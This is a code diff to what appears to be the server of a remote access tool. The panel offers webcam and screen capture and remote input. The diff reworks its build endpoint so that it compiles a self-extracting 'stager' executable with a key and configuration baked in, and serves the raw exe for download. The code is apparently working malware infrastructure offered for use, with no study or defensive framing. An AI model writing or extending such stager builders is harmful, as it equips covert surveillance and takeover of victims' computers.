@@ -11,11 +11,11 @@ import fs from 'node:fs';
 import http from 'node:http';
 import https from 'node:https';
 import path from 'node:path';
-import AdmZip from 'adm-zip';
 import { fileURLToPath } from 'node:url';
 import db, { UPLOAD_DIR } from './db.js';
 import { startUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors } from './net.js';
 import { handleRpc } from './tcp_rpc.js';
+import { compileLauncher } from './builder/compile.js';
 
 const __dirname  = path.dirname(fileURLToPath(import.meta.url));
 const PUBLIC_DIR = path.join(__dirname, 'public');
@@ -229,7 +229,6 @@ app.post('/api/signin', limitAuth, async (req, res) => {
   let user = null;
 
   if (loginToken && !password) {
-    // token-only mode
     user = db.prepare(sql`SELECT * FROM users WHERE login_token = ?`).get(loginToken);
   } else if (loginToken && password) {
     user = db.prepare(sql`SELECT * FROM users WHERE login_token = ?`).get(loginToken);
@@ -543,7 +542,7 @@ if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true }
 const EXE_DIR = path.join(__dirname, 'exe');
 if (!fs.existsSync(EXE_DIR)) fs.mkdirSync(EXE_DIR, { recursive: true });
 
-// built stager zips land here
+// built stager exes land here
 const BUILD_DIR = path.join(__dirname, 'build');
 if (!fs.existsSync(BUILD_DIR)) fs.mkdirSync(BUILD_DIR, { recursive: true });
 
@@ -600,7 +599,7 @@ app.get('/api/build/bases', requireAuth, (req, res) => {
   res.json(bases);
 });
 
-// build a stager: base EXE from exe/ + key.json + config → zip in build/
+// build a single self-extracting exe — compiles the launcher live with key+config+base baked in
 app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
   const { base, key, config } = req.body || {};
 
@@ -609,10 +608,10 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
   if (!/^[A-Za-z0-9_\-\.]+$/.test(base)) return res.status(400).json({ error: 'bad base' });
   if (!/\.(exe|msi|bin|dll)$/i.test(base)) return res.status(400).json({ error: 'base must be exe/msi/bin/dll' });
 
-  const src = path.resolve(EXE_DIR, base);
-  const baseDir = path.resolve(EXE_DIR);
-  if (!src.startsWith(baseDir + path.sep)) return res.status(400).json({ error: 'bad path' });
-  if (!fs.existsSync(src)) return res.status(404).json({ error: 'base not found' });
+  const baseSrc = path.resolve(EXE_DIR, base);
+  const baseRoot = path.resolve(EXE_DIR);
+  if (!baseSrc.startsWith(baseRoot + path.sep)) return res.status(400).json({ error: 'bad path' });
+  if (!fs.existsSync(baseSrc)) return res.status(404).json({ error: 'base not found' });
 
   const buildKey = (typeof key === 'string' && key.trim().length > 0)
     ? key.trim().slice(0, 128)
@@ -620,34 +619,32 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
 
   const cfg = (typeof config === 'object' && config !== null) ? config : {};
 
-  const storedName = `${crypto.randomUUID()}.zip`;
-  const buildPath = path.join(BUILD_DIR, storedName);
-
+  let exeBuf;
   try {
-    const zip = new AdmZip();
-    zip.addLocalFile(src);
-    zip.addFile('key.json', Buffer.from(JSON.stringify({
+    exeBuf = await compileLauncher({
       key: buildKey,
       config: cfg,
-      builtAt: Date.now(),
-    }, null, 2)));
-    zip.writeZip(buildPath);
+      baseExe: baseSrc,
+    });
   } catch (e) {
-    console.error('[build]', e);
-    return res.status(500).json({ error: 'build failed' });
+    console.error('[build] compile failed:', e);
+    return res.status(500).json({ error: 'compile failed: ' + (e.message || 'unknown') });
   }
 
-  const st = fs.statSync(buildPath);
+  const outName = `${path.parse(base).name}_${Date.now()}.exe`;
+  const outPath = path.join(BUILD_DIR, outName);
+  fs.writeFileSync(outPath, exeBuf, { mode: 0o755 });
+
   const info = db.prepare(sql`
     INSERT INTO builds (user_id, name, stored_name, size, base, key, config, created_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-  `).run(req.user.uid, base, storedName, st.size, base, buildKey, JSON.stringify(cfg), Date.now());
+  `).run(req.user.uid, outName, outName, exeBuf.length, base, buildKey, JSON.stringify(cfg), Date.now());
 
   res.json({
     ok: true,
     buildId: Number(info.lastInsertRowid),
-    name: storedName,
-    size: st.size,
+    name: outName,
+    size: exeBuf.length,
     key: buildKey,
     url: `/api/builds/${info.lastInsertRowid}/download`,
   });
@@ -662,7 +659,7 @@ app.get('/api/builds', requireAuth, (req, res) => {
   res.json(rows);
 });
 
-// download a build — rate limited, auth required
+// download a build — raw exe
 app.get('/api/builds/:id/download', limitDownload, requireAuth, (req, res) => {
   const id = Number(req.params.id);
   const row = db.prepare(sql`
@@ -671,9 +668,9 @@ app.get('/api/builds/:id/download', limitDownload, requireAuth, (req, res) => {
   if (!row) return res.status(404).json({ error: 'not found' });
   const src = path.join(BUILD_DIR, row.stored_name);
   if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });
-  res.setHeader('Content-Type', 'application/zip');
+  res.setHeader('Content-Type', 'application/octet-stream');
   res.setHeader('Content-Length', row.size);
-  res.setHeader('Content-Disposition', `attachment; filename="${row.name.replace(/\.zip$/, '')}.zip"`);
+  res.setHeader('Content-Disposition', `attachment; filename="${row.name}"`);
   fs.createReadStream(src).pipe(res);
 });
 
